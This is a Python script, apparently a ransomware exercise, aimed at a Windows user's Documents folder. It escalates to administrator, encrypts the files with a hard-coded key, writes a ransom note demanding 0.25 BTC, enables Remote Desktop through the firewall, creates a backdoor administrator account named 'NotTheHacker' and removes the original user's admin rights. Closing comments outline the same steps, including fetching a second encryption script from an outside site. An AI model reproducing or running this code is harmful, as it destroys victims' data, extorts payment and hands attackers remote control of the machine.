#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import ctypes, sys
import subprocess

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    key = "hfUogC40RsWhbqdeD5Ib6QBE4XQTYEUZAYhaBeOy_bw="
    fernet = Fernet(key)
    
    directory = 'C:\\Users\\JeanK\\Documents\\'
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            try:
                with open(filename, "rb") as file:
                    original = file.read()
                with open(f, 'wb') as file:
                    encrypted = fernet.encrypt(original)
                    file.write(encrypted)
            except:
                print("Nope")

    command = 'write-host "You have been hacked, pay 0,25BTC on the following address: bc1k0enkgdygjrsqtzq2n0yrf2493k99kkfjhx1wlh to get the encrypted data back!" > C:\\Users\\JeanK\\Desktop\\ReadMe.txt'
    subprocess.call(command, shell=True)

    subprocess.call("powershell.exe Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name 'fDenyTSConnections' -value 0", shell=True)
    subprocess.call("powershell.exe Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'", shell=True)


    subprocess.call('powershell.exe new-localuser -name NotTheHacker -Password (ConvertTo-SecureString -AsPlainText \'defaultPWD\' -Force) -UserMayNotChangePassword:$False', shell=True)
    subprocess.call("powershell.exe Set-LocalUser NotTheHacker -PasswordNeverExpires $false", shell=True)
    subprocess.call("powershell.exe add-localgroupmember -group 'Administrators' -member NotTheHacker", shell=True)


    subprocess.call("powershell.exe Remove-localgroupmember -group 'Administrators' -member 'JeanK'")

else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


# Step 0: Get the user
# user = os.system("whoami")
# Step 1, create new admin user
#    new-localuser -name NotTheHacker -Password (ConvertTo-SecureString -AsPlainText ‘defaultPWD’ -Force) -UserMayNotChangePassword:$False
#    Set-LocalUser NotTheHacker -PasswordNeverExpires $false
#    add-localgroupmember -group 'Administrator' -member NotTheHacker
# Step 2, encrypt documents folder
# invoke http request naar koenkoreman.be met 2e python script die encryptie doet
# pip install cryptography
# python3 encrypt.py user
# 
# file2
# key = SzBlbktJc0VuY3J5cHRpbmdGaWxlcw==
# fernet = Fernet(key)
 
# directory = 'C:\Users\' + user + '\Documents\'
# for filename in os.listdir(directory):
#    f = os.path.join(directory, filename)
#    # checking if it is a file
#    if os.path.isfile(f):
#       with open(f, 'wb') as file:
#           original = file.read()
#            encrypted = fernet.encrypt(original)
#            file.write(encrypted)
# Step 3, write txt on desktop
# write-host "You have been hacked, pay 0,25BTC on the following adress: bc1k0enkgdygjrsqtzq2n0yrf2493k99kkfjhx1wlh to get the data back! > C:\Users\whoami\Desktop\Readme.txt"
# Step 4, enable RDP
    # Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
    # Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
# 
# step 5, revoke admin rights current user
# 